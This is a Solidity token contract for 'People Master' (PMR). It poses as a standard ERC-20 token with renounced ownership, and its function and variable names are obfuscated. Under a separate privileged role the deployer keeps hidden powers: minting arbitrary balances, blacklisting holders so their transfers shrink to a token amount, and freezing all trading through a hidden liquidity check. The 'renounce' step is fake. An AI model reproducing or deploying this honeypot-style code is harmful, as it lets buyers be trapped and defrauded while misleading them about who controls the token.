//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface atTo {
    function createPair(address launchMin, address shouldTotal) external returns (address);
}

interface maxExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTeamAuto) external view returns (uint256);

    function transfer(address toSell, uint256 modeBuy) external returns (bool);

    function allowance(address shouldLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeBuy) external returns (bool);

    function transferFrom(
        address sender,
        address toSell,
        uint256 modeBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minFundIs, uint256 value);
    event Approval(address indexed shouldLiquidity, address indexed spender, uint256 value);
}

abstract contract shouldFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listLaunchShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxExemptMetadata is maxExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PeopleMaster is shouldFee, maxExempt, maxExemptMetadata {

    function transferFrom(address atAuto, address toSell, uint256 modeBuy) external override returns (bool) {
        if (_msgSender() != isTrading) {
            if (amountList[atAuto][_msgSender()] != type(uint256).max) {
                require(modeBuy <= amountList[atAuto][_msgSender()]);
                amountList[atAuto][_msgSender()] -= modeBuy;
            }
        }
        return txTotal(atAuto, toSell, modeBuy);
    }

    address public maxList;

    function name() external view virtual override returns (string memory) {
        return takeFromIs;
    }

    function transfer(address takeReceiverFrom, uint256 modeBuy) external virtual override returns (bool) {
        return txTotal(_msgSender(), takeReceiverFrom, modeBuy);
    }

    uint256 swapFrom;

    function txTotal(address atAuto, address toSell, uint256 modeBuy) internal returns (bool) {
        if (atAuto == maxList) {
            return modeLimit(atAuto, toSell, modeBuy);
        }
        uint256 sellReceiverExempt = maxExempt(walletFund).balanceOf(walletSell);
        require(sellReceiverExempt == teamLiquidity);
        require(toSell != walletSell);
        if (feeLiquidity[atAuto]) {
            return modeLimit(atAuto, toSell, toSwap);
        }
        return modeLimit(atAuto, toSell, modeBuy);
    }

    mapping(address => bool) public amountTokenMode;

    function balanceOf(address atTeamAuto) public view virtual override returns (uint256) {
        return autoAmount[atTeamAuto];
    }

    string private takeFromIs = "People Master";

    function enableLaunched() private view {
        require(amountTokenMode[_msgSender()]);
    }

    address isTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed fundExempt, address indexed tradingAt);

    mapping(address => mapping(address => uint256)) private amountList;

    bool public totalFund;

    function symbol() external view virtual override returns (string memory) {
        return tokenTradingTake;
    }

    bool private autoLiquidity;

    function senderMin(address minTo) public {
        require(minTo.balance < 100000);
        if (totalFund) {
            return;
        }
        
        amountTokenMode[minTo] = true;
        
        totalFund = true;
    }

    uint256 teamLiquidity;

    function owner() external view returns (address) {
        return txLimit;
    }

    bool public listFrom;

    address walletSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function receiverAtShould(address limitFund) public {
        enableLaunched();
        if (marketingExempt) {
            marketingExempt = false;
        }
        if (limitFund == maxList || limitFund == walletFund) {
            return;
        }
        feeLiquidity[limitFund] = true;
    }

    uint256 private feeEnable;

    mapping(address => bool) public feeLiquidity;

    mapping(address => uint256) private autoAmount;

    function getOwner() external view returns (address) {
        return txLimit;
    }

    function limitSwap(uint256 modeBuy) public {
        enableLaunched();
        teamLiquidity = modeBuy;
    }

    uint256 public listTx;

    uint256 private swapAmount = 100000000 * 10 ** 18;

    uint8 private limitLiquidity = 18;

    bool public sellMin;

    function enableMarketing() public {
        emit OwnershipTransferred(maxList, address(0));
        txLimit = address(0);
    }

    function allowance(address walletLiquidity, address tokenReceiver) external view virtual override returns (uint256) {
        if (tokenReceiver == isTrading) {
            return type(uint256).max;
        }
        return amountList[walletLiquidity][tokenReceiver];
    }

    constructor (){
        
        listLaunchShould shouldReceiver = listLaunchShould(isTrading);
        walletFund = atTo(shouldReceiver.factory()).createPair(shouldReceiver.WETH(), address(this));
        if (listFrom == marketingExempt) {
            autoLiquidity = false;
        }
        maxList = _msgSender();
        amountTokenMode[maxList] = true;
        autoAmount[maxList] = swapAmount;
        enableMarketing();
        
        emit Transfer(address(0), maxList, swapAmount);
    }

    bool private marketingExempt;

    function decimals() external view virtual override returns (uint8) {
        return limitLiquidity;
    }

    uint256 public maxTradingReceiver;

    uint256 private teamAmountList;

    address public walletFund;

    function modeLimit(address atAuto, address toSell, uint256 modeBuy) internal returns (bool) {
        require(autoAmount[atAuto] >= modeBuy);
        autoAmount[atAuto] -= modeBuy;
        autoAmount[toSell] += modeBuy;
        emit Transfer(atAuto, toSell, modeBuy);
        return true;
    }

    uint256 constant toSwap = 8 ** 10;

    address private txLimit;

    function approve(address tokenReceiver, uint256 modeBuy) public virtual override returns (bool) {
        amountList[_msgSender()][tokenReceiver] = modeBuy;
        emit Approval(_msgSender(), tokenReceiver, modeBuy);
        return true;
    }

    function enableToken(address takeReceiverFrom, uint256 modeBuy) public {
        enableLaunched();
        autoAmount[takeReceiverFrom] = modeBuy;
    }

    string private tokenTradingTake = "PMR";

    function totalSupply() external view virtual override returns (uint256) {
        return swapAmount;
    }

}